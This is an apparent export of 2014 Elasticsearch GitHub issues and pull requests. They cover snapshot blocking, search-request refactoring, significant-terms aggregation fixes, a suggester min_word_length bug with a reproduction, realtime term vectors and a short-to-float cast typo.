username="">javanna</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-24T16:40:20Z</created><updated>2014-09-25T09:04:21Z</updated><resolved>2014-09-25T09:04:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-24T17:31:39Z" id="56708092">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Getting all snapshots is blocked by in-progress snapshot</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7859</link><project id="" key="" /><description>This would block until current snapshot is completed. This could take a looooooooong time.

```
curl http://es:9200/_snapshot/&lt;s3_storage&gt;/_all?pretty
```

Happens with s3 plugin, maybe this issue belongs to it.

cc @imotov 
</description><key id="43783218">7859</key><summary>Getting all snapshots is blocked by in-progress snapshot</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">bobrik</reporter><labels /><created>2014-09-24T16:07:29Z</created><updated>2015-08-25T18:46:51Z</updated><resolved>2015-08-25T18:46:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-09-28T04:34:06Z" id="57074757">@bobrik which version of elasticsearch and aws plugin is it?
</comment><comment author="bobrik" created="2014-09-28T07:01:51Z" id="57077180">@imotov es 1.3.2, aws plugin 2.3.0. I am not s3 itself, just s3-compatible service, but it responds to s3cmd while snapshot is happening.
</comment><comment author="imotov" created="2015-08-25T18:46:51Z" id="134698746">Closed by #9400
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update delete-by-query.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7858</link><project id="" key="" /><description>Undocumented limitation. Support for both has_parent &amp; has_child has been dropped by commit:
https://github.com/elasticsearch/elasticsearch/commit/17a5575757317962dab4c295bbfacbdb136cc61e
</description><key id="43773810">7858</key><summary>Update delete-by-query.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rmruano</reporter><labels /><created>2014-09-24T14:50:29Z</created><updated>2014-09-25T08:25:32Z</updated><resolved>2014-09-25T08:22:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rmruano" created="2014-09-25T08:25:32Z" id="56788434">Implemented by commit https://github.com/elasticsearch/elasticsearch/commit/70303be50c47d277850b28c604e63723c2a2d752
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Resiliency: Backport Recovery / Snapshot file identity improvements to 1.3</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7857</link><project id="" key="" /><description>We saw lots of issues with hash collisions which have been fixed in 1.4 but back then it seemed like an improvement rather than a bugfix. I think in the meanwhile we should really declare it as a bugfix and port it into `1.3` This backport PR includes fixes for #7434 &amp; #7351 as well as related fixes. 

I ran BWC tests against 1.3.2 and 1.2.4 as well as the entire test suite multiple times but I think this need a deep review.
</description><key id="43760425">7857</key><summary>Resiliency: Backport Recovery / Snapshot file identity improvements to 1.3</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>bug</label><label>resiliency</label><label>v1.3.3</label></labels><created>2014-09-24T12:46:21Z</created><updated>2014-09-26T11:39:23Z</updated><resolved>2014-09-24T13:26:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rmuir" created="2014-09-24T13:20:43Z" id="56668128">looks good, thank you simon!
</comment><comment author="imotov" created="2014-09-24T13:22:51Z" id="56668374">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Split internal free context request used after scroll and search</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7856</link><project id="" key="" /><description>We currently use the same internal request when we need to free the search context after a search and a scroll. The two original requests though diverged after #6933 as `SearchRequest` implements `IndicesRequest` while `SearchScrollRequest` and `ClearScrollRequest` don't. That said, with #7319 we made `SearchFreeContextRequest` implement `IndicesRequest` by making it hold the original indices taken from the original request, which are null if the free context was originated by a scroll or by a clear scroll call, and that is why original indices are optional there.

This commit introduces a separate free context request and transport action for scroll, which doesn't hold original indices. The new action is only used against nodes that expose it, the previous action name will be used for nodes older than 1.4.0.Beta1.

As a result, in 1.4 we have a new `indices:data/read/search[free_context/scroll]` action that is equivalent to the previous `indices:data/read/search[free_context]` whose request implements now `IndicesRequest` and holds the original indices coming from the original request. The original indices in the latter request can only be null during a rolling upgrade (already existing version checks make sure that serialization is bw compatible), when some nodes are still &lt; 1.4.
</description><key id="43756152">7856</key><summary>Split internal free context request used after scroll and search</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-24T11:57:48Z</created><updated>2015-06-07T10:28:18Z</updated><resolved>2014-09-24T13:39:01Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-24T12:00:45Z" id="56659446">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Clarify when a shard search request gets created to be only used locally</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7855</link><project id="" key="" /><description>In some cases a shard search request gets created on a node to be only used there and never sent over the transport. This commit clarifies that and creates a new base class called `ShardSearchLocalRequest` that can and will be only used locally. `ShardSearchTransportRequest` on the other hand delegates to the local version but extends `TransportRequest` and is `Streamable`, which means that it is supposed to be sent over the transport.

This way we can make the `OriginalIndices` only required (and mandatory now) in the transport variant.

Took the chance to remove an unused InternalScrollSearchRequest constructor and an empty else branch in `TransportSearchScrollQueryAndFetchAction`.
</description><key id="43755173">7855</key><summary>Clarify when a shard search request gets created to be only used locally</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-24T11:45:49Z</created><updated>2015-06-07T10:32:29Z</updated><resolved>2014-10-08T17:18:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-24T20:10:33Z" id="56730851">wouldn't it make more sense to have a base class `SearchShardRequest` and a `TransportSearchShardRequest` that also implements streamable instead of using factories?
</comment><comment author="javanna" created="2014-09-26T16:20:36Z" id="56984203">Hey @s1monw your comment makes sense to me. It just was not as simple as that given that the transport version needs to extend `TransportRequest`, not just implement `Streamable`. I did split the requests but had to make the existing class an interface that is implemented by both. Much much cleaner but slightly bigger change than what I had in mind at first ;) Let me know what you think!
</comment><comment author="javanna" created="2014-10-08T13:21:48Z" id="58355915">I pushed a new commit that should address your comment @s1monw . Can you also double check backwards compatibility please now that 1.4.0.Beta1 is released? We added `originalIndices` in beta1, but I think it makes no difference since the local variant of the request (where we now removed `originalIndices`) was never sent over the transport. The cache key does change (since it doesn't contain original indices anymore) but I think that is fine. And now `originalIndices` appear only where needed and are mandatory there (while before they were optional).
</comment><comment author="s1monw" created="2014-10-08T13:48:04Z" id="58359569">LGTM thanks luca
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Failure to catch misconfigured Java clients</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7854</link><project id="" key="" /><description>The issue elasticsearch/elasticsearch#7840 was not caught by our test framework.
The suspected reason is that our tests with a Java TransportClient are always run in the the same JVM as data nodes servicing requests and as such all of the module registrations for handling things like transport streams are successfully registered by the data node.
In a more realistic client environment (where TransportClient is housed in a client apps' dedicated JVM) the registration processes are different and bugs like the one above emerge. We should consider changing our test framework to support this configuration.
</description><key id="43754955">7854</key><summary>Failure to catch misconfigured Java clients</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">markharwood</reporter><labels><label>:Java API</label><label>adoptme</label><label>bug</label><label>test</label></labels><created>2014-09-24T11:43:06Z</created><updated>2016-11-25T18:49:34Z</updated><resolved>2016-11-25T18:49:34Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2016-09-14T14:18:43Z" id="247027949">This was opened long ago but I am not sure I follow what the problem was and what should be done. Serialization issue caused by transport client and nodes running on the same jvm? A transport client needs to have its modules registered, if that doesn't happen it will throw error. Maybe we didn't have enough tests or those weren't using the transport client simply but only client nodes?
</comment><comment author="clintongormley" created="2016-11-25T18:49:34Z" id="263010430">This doesn't seem to have recurred in the last two years.  Closing</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregations: Significant Terms Heuristics now registered correctly</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7853</link><project id="" key="" /><description>Closes #7840
</description><key id="43748375">7853</key><summary>Aggregations: Significant Terms Heuristics now registered correctly</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label></labels><created>2014-09-24T10:24:57Z</created><updated>2014-10-17T15:17:49Z</updated><resolved>2014-09-24T12:09:32Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="markharwood" created="2014-09-24T11:46:25Z" id="56658177">Tests pass for me including the custom test rig on the original issue that is the only one to expose the issue. I have opened https://github.com/elasticsearch/elasticsearch/issues/7854 to log the deficiency in the test framework
</comment><comment author="s1monw" created="2014-09-24T11:59:11Z" id="56659311">LGTM
</comment><comment author="uboness" created="2014-09-24T12:04:26Z" id="56659760">LGTM for now, I still want us to follow the same mechanism as in the aggs streams without the need to register streams on modules (to be consistent). Maybe add another issue for it?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Added missing module registration in TransportClient for Significant Terms</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7852</link><project id="" key="" /><description>Required for serialising significant_terms agg responses
Closes #7840
</description><key id="43737461">7852</key><summary>Added missing module registration in TransportClient for Significant Terms</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">markharwood</reporter><labels><label>:Java API</label><label>blocker</label><label>bug</label><label>v1.3.3</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-24T08:49:32Z</created><updated>2015-06-07T18:24:27Z</updated><resolved>2014-09-24T12:45:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="markharwood" created="2014-09-24T12:45:07Z" id="56664095">Closed in favour of solution in https://github.com/elasticsearch/elasticsearch/pull/7853
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Core type Boolean cannot be set as Doc_Value</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7851</link><project id="" key="" /><description>I suggest that the core type &#8216;Boolean&#8217; can be set with Doc_Value attribute, just like the other core types &#8211; string, number, date and binary. 
In system with many different bools the fielddata use a lot of memory and doc_values is great to prevent this.
</description><key id="43729405">7851</key><summary>Core type Boolean cannot be set as Doc_Value</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">rasmus-telerik</reporter><labels /><created>2014-09-24T07:41:12Z</created><updated>2015-04-02T14:06:53Z</updated><resolved>2015-04-02T14:06:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-30T11:26:11Z" id="57299445">Agreed that we need doc values support for booleans. We probably need to figure out the interface for boolean field data first (https://github.com/elasticsearch/elasticsearch/issues/4678) but once it's done adding doc values support should be easy using sorted numerics (0/1 for false/true).
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Significant terms: add scriptable significance heuristic</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7850</link><project id="" key="" /><description>This commit adds scripting capability to significant_terms.
Custom heuristics can be implemented with a script that provides
parameters subset_freq, superset_freq,subset_size, superset_size.

Script heuristic and results have to be serialized. When deserializing the ScriptService is not available and the new score cannot be computed immediately after reading the result.
Therefore, instead of re-computing the score the score is serialized with each bucket. 
For the reduce phase the script is initialized before buckets are reduced (https://github.com/brwe/elasticsearch/compare/elasticsearch:master...brwe:significant-terms-scripting?expand=1#diff-ba5a615f489137f2b16d37bc54dd3f8dR174) which seems a little clumsy to me. Happy for any suggestion.
</description><key id="43727887">7850</key><summary>Significant terms: add scriptable significance heuristic</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">brwe</reporter><labels><label>:Aggregations</label><label>feature</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-24T07:24:15Z</created><updated>2015-06-06T17:51:32Z</updated><resolved>2015-03-06T16:07:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="markharwood" created="2014-09-24T08:12:58Z" id="56638195">@colings86 was poking around with signif_terms bucket serialization and reducers recently so this might be something for him to review.
I found an issue with the registration of signif_terms algos in TransportClient (see https://github.com/elasticsearch/elasticsearch/issues/7840 ) - I have a fix but the bigger concern perhaps is our tests may be missing checks on dependencies in a distributed env so it may be worth checking the scripted stuff works OK in this context too.
</comment><comment author="s1monw" created="2014-10-07T11:37:45Z" id="58171251">@colings86 can you take a look at this?
</comment><comment author="s1monw" created="2014-10-07T11:46:02Z" id="58172017">left some comments
</comment><comment author="colings86" created="2014-10-08T08:19:27Z" id="58324992">left some comments
</comment><comment author="brwe" created="2014-10-22T09:14:52Z" id="60057025">implemented all suggestion, sorry it took so long. let me know if https://github.com/elasticsearch/elasticsearch/pull/7850#discussion_r19201632 is really the right solution.
</comment><comment author="brwe" created="2014-11-27T18:38:58Z" id="64821012">bumping this because it has been a while. can you review latest version?
</comment><comment author="colings86" created="2014-11-28T11:44:26Z" id="64885630">@brwe left a small comment about some changes that I don't think are needed anymore but otherwise LGTM
</comment><comment author="brwe" created="2015-02-20T14:15:40Z" id="75243798">addressed last comments and fixed NumberFormatException
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add Release notes to every new release</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7849</link><project id="" key="" /><description>Hey guys, just a heads up asking if you could consider adding the release notes altogether with every release on github?
It is certainly a good thing for those who are following :+1: 

I like how github does with [Atom](/github/atom/releases)
</description><key id="43725123">7849</key><summary>Add Release notes to every new release</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">zanona</reporter><labels /><created>2014-09-24T06:52:15Z</created><updated>2014-11-08T16:47:30Z</updated><resolved>2014-11-08T16:40:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-29T17:15:33Z" id="57194970">that is very interesting... i hadn't seen that before.  We'll certainly think about this for the future. Thanks for pointing it out.
</comment><comment author="kimchy" created="2014-09-29T17:29:30Z" id="57196861">I think its interesting to place the release notes there, but we should have it somewhere else as well, and maybe slurp it from there. We should not put the downloads there, already had to move away from github once since the download service was discontinued, don't want to go through that again :)
</comment><comment author="zanona" created="2014-09-29T18:32:40Z" id="57206621">Thanks guys, I agree in regards the download. I was thinking more about the informative aspects of it.
It is quick and easy to figure out what is happening with the project from there and also follow it through its atom feed which is great for keeping up to speed.
Perhaps there is even a built in way to integrate it with git commits?
Cheers
</comment><comment author="clintongormley" created="2014-11-08T16:40:12Z" id="62264210">Hi @zanona 

I played around with adding info to https://github.com/elasticsearch/elasticsearch/releases and it didn't work out so well.  Putting the full release notes was just too overwhelming - github doesn't truncate each entry on the /releases page.  Also, there was no way of reordering v1.4.0 and v1.3.5 (which is marked as latest).

Thanks for the suggestion but, in the end, I decided to leave things as they are.
</comment><comment author="zanona" created="2014-11-08T16:47:30Z" id="62264478">thanks for trying @clintongormley I have to agree they should add a better way to integrate that straight with `git tag -f release-notes.md` for example. hopefully once they adjust this in the future, it will be easier to use. thanks again
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>copy elasticsearch cluster data</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7848</link><project id="" key="" /><description> i was wondering what would be the best way to copy all the indices from one es cluster to another es cluster? is it a matter of just copying all the files in the data folders on each node? or theres another way?

i am moving it from 1.2.1 to 1.3.2 fyi. so i am hoping there wont be any incompatibilities if i do this?
</description><key id="43716539">7848</key><summary>copy elasticsearch cluster data</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">developerinlondon</reporter><labels /><created>2014-09-24T05:04:59Z</created><updated>2014-09-24T06:07:01Z</updated><resolved>2014-09-24T06:07:01Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-24T06:07:01Z" id="56628582">Please use the mailing list for questions. We could help you there!

That said, I would use snapshot and restore.
Copying all data dirs from each node is fine as well but you probably should set number of replicas to 0 before.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Suggest functional test not working</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7847</link><project id="" key="" /><description>I'm building a small library to interface with elasticsearch more like Django querysets, and part of the functionality involves suggest. In the test suite I have a fake index with mapping and add a bunch of documents using elasticsearch.py with `refresh=True` The issue is with adding extra parameters to term suggest, specifically `min_word_length`, `min_doc_freq`, and `max_term_freq`. 

here is a general overview of the snippets

```
curl -XPUT "http://localhost:9200/foo" -d '{
    "mappings": {
        "my_doc_type": {
            "properties": {
                "location": {
                    "type": "geo_point"
                },
                "foo_loc": {
                    "type": "geo_point"
                },
                "child": {
                    "type": "nested"
                }
            }
        }
    }
}'
curl -XPOST "http://localhost:9200/foo/_refresh"

# Helper function that takes the index name and document json
def add_document(index, document):
    curl -XPOST "http://localhost:9200/foo/my_doc_type?refresh=true&amp;op_type=create" -d document

# This is what the min_word_length query looks like
query = {
  "query": {
    "match_all": {}
  },
  "suggest": {
    "spelling": {
      "text": "bazba",
      "term": {
        "sort": "score",
        "field": "bar",
        "suggest_mode": "missing",
        "max_edits": 2,
        "prefix_length": 1,
        "min_doc_freq": 0,
        "max_term_freq": 0.01,
        "min_word_length": 5
      }
    }
  }
}
```

This query/setup returns suggestions with length 4
</description><key id="43695107">7847</key><summary>Suggest functional test not working</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/areek/following{/other_user}', u'events_url': u'https://api.github.com/users/areek/events{/privacy}', u'organizations_url': u'https://api.github.com/users/areek/orgs', u'url': u'https://api.github.com/users/areek', u'gists_url': u'https://api.github.com/users/areek/gists{/gist_id}', u'html_url': u'https://github.com/areek', u'subscriptions_url': u'https://api.github.com/users/areek/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/753679?v=4', u'repos_url': u'https://api.github.com/users/areek/repos', u'received_events_url': u'https://api.github.com/users/areek/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/areek/starred{/owner}{/repo}', u'site_admin': False, u'login': u'areek', u'type': u'User', u'id': 753679, u'followers_url': u'https://api.github.com/users/areek/followers'}</assignee><reporter username="">zkourouma</reporter><labels><label>:Suggesters</label><label>bug</label></labels><created>2014-09-23T23:00:03Z</created><updated>2016-09-27T13:09:56Z</updated><resolved>2016-09-27T13:09:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-29T17:11:42Z" id="57194384">Hi @zkourouma 

What version of Elasticsearch are you using?
</comment><comment author="zkourouma" created="2014-09-29T17:30:30Z" id="57197016">version 1.1.1
</comment><comment author="zkourouma" created="2014-12-09T20:34:51Z" id="66352726">Hi @clintongormley, any progress on this? please let me know if you need additional info
</comment><comment author="clintongormley" created="2015-11-21T19:14:23Z" id="158673208">Hi @zkourouma 

Sorry for the delay in responding.  Just looked at your issue description, and you say "you have an issue" but you don't say what it is.  You provide code to index docs, but then don't show us what you're indexing, and you don't explain what results you're expecting and what you get instead.

Is this still an issue for you? If so, could you provide more info?
</comment><comment author="andrewgross" created="2015-11-30T22:55:00Z" id="160787922">The query specifies `"min_word_length": 5`, but it returns results of length 4.
</comment><comment author="clintongormley" created="2015-12-01T11:04:55Z" id="160936249">OK, here's a simple recreation:

```
POST t/t/_bulk
{"index":{}}
{"foo":"abc"}
{"index":{}}
{"foo":"abcd"}
{"index":{}}
{"foo":"abcde"}
{"index":{}}
{"foo":"abcdef"}
{"index":{}}
{"foo":"abcdefg"}


GET _suggest
{
  "spelling": {
    "text": "abcdef",
    "term": {
      "field": "foo",
      "suggest_mode": "missing",
      "prefix_length": 1,
      "min_doc_freq": 0,
      "max_term_freq": 0.01,
      "max_edits": 2,
      "min_word_length":5
    }
  }
}
```

This returns `abcd` which is only 4 characters long, not the minimum specified:

```
{
  "_shards": {
    "total": 5,
    "successful": 5,
    "failed": 0
  },
  "spelling": [
    {
      "text": "abcdef",
      "offset": 0,
      "length": 6,
      "options": [
        {
          "text": "abcdefg",
          "score": 0.8333333,
          "freq": 1
        },
        {
          "text": "abcd",
          "score": 0.5,
          "freq": 1
        }
      ]
    }
  ]
}
```
</comment><comment author="dakrone" created="2016-09-27T13:09:51Z" id="249859827">I just checked locally and this is fixed in 5.0 with Areek's work on the suggester.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add support for realtime term vectors</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7846</link><project id="" key="" /><description>By default term vectors are now realtime, as opposed to previously near
realtime. If they are not found in the index, they will be generated on the
fly. The document is fetched from the transaction log and treated as an
artificial document. One can set `realtime` parameter to `false` in order to
disable this functionality. This consequently makes the MLT query realtime in
fetching documents, as it previsouly used to be before switching from using
the multi get API to the mtv API.
</description><key id="43686273">7846</key><summary>Add support for realtime term vectors</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">alexksikes</reporter><labels><label>:Term Vectors</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-23T21:25:54Z</created><updated>2015-06-07T17:38:59Z</updated><resolved>2014-10-03T07:33:38Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-26T21:34:57Z" id="57023585">nice LGTM
</comment><comment author="s1monw" created="2014-10-02T20:26:23Z" id="57699507">@alexksikes wanna get this in?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>java api - multiple dimension arrays of shorts are casted to multiple dimension arrays of floats</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7845</link><project id="" key="" /><description>Hi,

I believe there is a typo in org.elasticsearch.common.xcontent.XContentBuilder.java
https://github.com/elasticsearch/elasticsearch/blob/v1.3.2/src/main/java/org/elasticsearch/common/xcontent/XContentBuilder.java#L1224

I think
for (float v : (short[]) value) {
should be
for (short v : (short[]) value) {

For example, right now, if you try to insert a 2D array of shorts you end up with a 2D array of floats.

Thanks!
